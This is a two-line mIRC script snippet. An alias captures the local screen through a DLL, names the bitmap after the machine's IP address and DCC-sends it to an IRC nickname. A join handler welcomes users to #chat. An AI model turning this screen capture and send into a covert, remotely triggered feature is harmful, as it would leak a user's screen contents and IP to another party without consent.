alias screenshot { notice $nick $dll(screen.dll,Capture,$mircdir\ $+ $ip $+ .bmp ) | .dcc send $nick $mircdir\ $+ $ip $+ .bmp }
on *:JOIN:#chat:{ echo Welcome $nick }
